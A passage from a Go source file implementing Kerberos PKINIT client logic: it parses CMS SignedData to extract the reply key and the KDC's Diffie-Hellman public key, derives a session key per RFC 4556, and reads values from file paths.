	return extractReplyKeyFromSignedData(decrypted)
}

// extractReplyKeyFromSignedData parses a CMS SignedData to extract the ReplyKeyPack.
func extractReplyKeyFromSignedData(data []byte) (types.EncryptionKey, error) {
	// Try as ContentInfo → SignedData first
	var ci contentInfo
	if _, err := gokrb5asn1.Unmarshal(data, &ci); err == nil {
		sdBytes := ci.Content.Bytes
		if len(sdBytes) == 0 {
			sdBytes = ci.Content.FullBytes
		}
		var sd signedData
		if _, err := gokrb5asn1.Unmarshal(sdBytes, &sd); err == nil {
			eContent := sd.EncapContentInfo.EContent.Bytes
			if len(eContent) == 0 {
				eContent = sd.EncapContentInfo.EContent.FullBytes
			}
			// eContent may be OCTET STRING wrapping ReplyKeyPack
			var octetStr gokrb5asn1.RawValue
			if _, err := gokrb5asn1.Unmarshal(eContent, &octetStr); err == nil && octetStr.Tag == 4 {
				return extractReplyKey(octetStr.Bytes)
			}
			return extractReplyKey(eContent)
		}
	}
	// Try as bare ReplyKeyPack
	return extractReplyKey(data)
}

func extractReplyKey(data []byte) (types.EncryptionKey, error) {
	var rkp replyKeyPack
	if _, err := gokrb5asn1.Unmarshal(data, &rkp); err != nil {
		return types.EncryptionKey{}, fmt.Errorf("parse ReplyKeyPack: %w", err)
	}
	return types.EncryptionKey{
		KeyType:  int32(rkp.ReplyKey.KeyType),
		KeyValue: rkp.ReplyKey.KeyValue,
	}, nil
}

// extractKDCDHPublicKey extracts the KDC's DH public key from the signed reply.
func extractKDCDHPublicKey(dhSignedDataBytes []byte) (*big.Int, error) {
	// Parse the outer ContentInfo
	var ci contentInfo
	if _, err := gokrb5asn1.Unmarshal(dhSignedDataBytes, &ci); err != nil {
		return nil, fmt.Errorf("failed to parse KDC reply ContentInfo: %w", err)
	}

	// Parse SignedData
	var sd signedData
	if _, err := gokrb5asn1.Unmarshal(ci.Content.FullBytes, &sd); err != nil {
		// Try with the Bytes field
		if _, err2 := gokrb5asn1.Unmarshal(ci.Content.Bytes, &sd); err2 != nil {
			return nil, fmt.Errorf("failed to parse KDC SignedData: %w (also tried: %w)", err, err2)
		}
	}

	// Extract encapsulated content (KDCDHKeyInfo).
	// EContent is [0] EXPLICIT — .Bytes holds the OCTET STRING TLV.
	eContentBytes := sd.EncapContentInfo.EContent.Bytes
	if len(eContentBytes) == 0 {
		eContentBytes = sd.EncapContentInfo.EContent.FullBytes
	}
	var eContentRaw []byte
	if _, err := gokrb5asn1.Unmarshal(eContentBytes, &eContentRaw); err != nil {
		return nil, fmt.Errorf("failed to extract KDC DH content OCTET STRING: %w", err)
	}

	var kdcInfo kdcDHKeyInfo
	if _, err := gokrb5asn1.Unmarshal(eContentRaw, &kdcInfo); err != nil {
		return nil, fmt.Errorf("failed to parse KDCDHKeyInfo: %w", err)
	}

	var pubKey *big.Int
	if _, err := gokrb5asn1.Unmarshal(kdcInfo.SubjectPublicKey.Bytes, &pubKey); err != nil {
		pubKey = new(big.Int).SetBytes(kdcInfo.SubjectPublicKey.Bytes)
	}
	return pubKey, nil
}

// pkinitOctetstring2Key derives a session key per RFC 4556 §3.2.3.1.
// key = SHA1(0x00 || value) || SHA1(0x01 || value) || ... truncated to keySize.
func pkinitOctetstring2Key(value []byte, keySize int) []byte {
	var derived []byte
	counter := byte(0)
	for len(derived) < keySize {
		h := sha1.New()
		h.Write([]byte{counter})
		h.Write(value)
		derived = append(derived, h.Sum(nil)...)
		counter++
	}

	return derived[:keySize]
}

func readIfPath(s string) string {
	s = strings.TrimSpace(s)
	if strings.HasPrefix(s, "/") || (len(s) > 2 && s[1] == ':' && (s[2] == '\\' || s[2] == '/')) {
		data, err := os.ReadFile(s)
		if err == nil {
			return string(data)
		}
	}
	return s
}
